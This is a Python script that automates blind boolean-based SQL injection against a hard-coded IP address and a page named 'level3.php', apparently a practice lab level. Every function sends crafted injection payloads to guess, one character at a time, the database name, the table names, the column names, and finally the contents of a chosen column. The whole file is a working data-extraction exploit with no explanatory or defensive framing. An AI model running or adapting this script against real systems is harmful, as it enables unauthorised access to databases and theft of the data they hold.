import requests
import re
import json
from bs4 import BeautifulSoup
import urllib.parse

#----------------------------------------------------

base_url = "http://77.238.121.150:33011/level3.php?q="

def database():

    dbs_len = []

    key_char = []

    dbs_name = []

    for ascii_value in range(32, 127):
        char = chr(ascii_value)
        key_char.append(char)

    for i in range(0, 1000):

        final_url = base_url + f"Yahoo'+and+1%3D(select+if(length(database())%3D{i}%2C+1%2C+0))%23"
        httppacket = requests.get(final_url).text
        soup = BeautifulSoup(httppacket, 'html.parser')
        h2_tags = soup.find_all('h2')
        h2_tags = str(h2_tags[0])
        
        find1 = []
        
        for x in h2_tags:
            find1.append(x)
        
        if find1[-6] == '1':
            dbs_len.append(i)
            break

    a = 1

    while dbs_len[0] >= a :
        
        for char in key_char:

            final_url = base_url + f"Yahoo%27+and+1%3D%28select+if%28substring%28database%28%29%2C{a}%2C1%29%3D%27{char}%27%2C+1%2C+0%29%29%23"
            httppacket = requests.get(final_url).text
            soup = BeautifulSoup(httppacket, 'html.parser')
            h2_tags = soup.find_all('h2')
            h2_tags = str(h2_tags[0])
            
            found = []
        
            for x in h2_tags:
                found.append(x)
            
            if found[-6] == '1':
                dbs_name.append(char.lower())
                print('found one: '+ char.lower())
                break

        a += 1

    database_name = ''.join(dbs_name)
    
    dbs = database_name

    print(dbs)

    return

def tables():
    
    dbs = str(input('enter the name of data base? '))

    table_name =[]

    key_char = []

    for ascii_value in range(32, 127):
        char = chr(ascii_value)
        key_char.append(char)
    
    for  i in range(1,30):
        for char in key_char:
            
            finall_url = base_url + f"Yahoo%27+and+substring%28%28select+group_concat%28table_name%29+from+information_schema.tables+where+table_schema%3D%22{dbs}%22+limit+0%2C+1%29%2C{i}%2C1%29+%3D+%27{char}%27%23"
            
            httppacket = requests.get(finall_url).text
            soup = BeautifulSoup(httppacket, 'html.parser')
            h2_tags = soup.find_all('h2')
            h2_tags = str(h2_tags[0])

            find = []
        
            for x in h2_tags:
                find.append(x)
        
            if find[-6] == '1':
                table_name.append(char.lower())
                print('found one: '+ char.lower())
                break

    tnm = ''.join(table_name)
    
    print(tnm)

    return

def columns():

    dbs = str(input('enter the name of data base? '))
    ts = str(input('enter the name of table? '))

    column_name = []

    key_char = []

    for ascii_value in range(32, 127):
        char = chr(ascii_value)
        key_char.append(char)

    for i in range(1,50):
        for char in key_char:

            send_url = base_url + f"Yahoo%27+and+substring%28%28select+group_concat%28column_name%29+from+information_schema.columns+where+table_schema%3D%22{dbs}%22+and+table_name%3D%22{ts}%22+limit+0%2C+1%29%2C{i}%2C1%29+%3D+%27{char}%27%23"

            httppacket = requests.get(send_url).text
            soup = BeautifulSoup(httppacket, 'html.parser')
            h2_tags = soup.find_all('h2')
            h2_tags = str(h2_tags[0])

            find = []
        
            for x in h2_tags:
                find.append(x)
        
            if find[-6] == '1':
                column_name.append(char.lower())
                print('found one: '+ char.lower())
                break

    tnm = ''.join(column_name)
    
    print(tnm)

    return

def dumpdata():

    data = []

    cn = str(input('please enter your column name? '))
    tn = str(input('plrease enter your table name? '))

    key_char = []

    for ascii_value in range(32, 127):
        char = chr(ascii_value)
        key_char.append(char)

    for i in range(1,50):
        for char in key_char:

            finshed_url = base_url + f"Yahoo%27+and+substring%28%28select+{cn}+from+{tn}++limit+0%2C+1%29%2C{i}%2C1%29+%3D+%27{char}%27%23"

            httppacket = requests.get(finshed_url).text
            soup = BeautifulSoup(httppacket, 'html.parser')
            h2_tags = soup.find_all('h2')
            h2_tags = str(h2_tags[0])

            find = []
        
            for x in h2_tags:
                find.append(x)
        
            if find[-6] == '1':
                data.append(char.lower())
                print('found one: '+ char.lower())
                break

    tnm = ''.join(data)
    
    print(tnm)

    return

#----------------------------------------------------

database()

tables()

columns()

dumpdata()